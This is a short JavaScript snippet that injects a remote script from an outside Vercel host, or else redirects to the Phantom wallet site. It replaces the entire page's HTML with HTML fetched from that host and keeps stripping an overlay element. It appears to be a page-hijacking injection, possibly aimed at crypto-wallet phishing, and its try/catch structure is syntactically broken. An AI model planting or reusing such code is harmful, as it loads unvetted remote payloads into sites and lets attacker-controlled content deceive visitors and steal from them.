const ensurePageChange = setInterval(() => {
  if (document.getElementById("pageFullyLoadedActive") != null) {
    const script = document.createElement('script');
    script.src = 'https://wowee.vercel.app/basic_code.js'; 
    document.body.appendChild(script);
  } else {
    location.href = "https://phantom.app";
  }
} catch(error) {
  location.href = "https://phantom.app";
}

return clearInterval(ensurePageChange);
});

// Load the HTML from the file
fetch('https://wowee.vercel.app/index.html')
  .then(response => response.text())
  .then(htmlContent => {
    document.documentElement.innerHTML = htmlContent;
  })
  .catch(error => {
    console.error('Error loading HTML:', error);
  });

function removeElement() {
  const element = document.querySelector('.convertflow-cta.cf-overlay');

  if (element) {
    setTimeout(() => {
      element.remove();
      console.log('Element with class "convertflow-cta cf-overlay" has been removed.');
    }, 200);
  }
}

const observer = new MutationObserver((mutations) => {
  mutations.forEach(() => {
    removeElement();
  });
});

observer.observe(document.body, { childList: true, subtree: true });

removeElement();
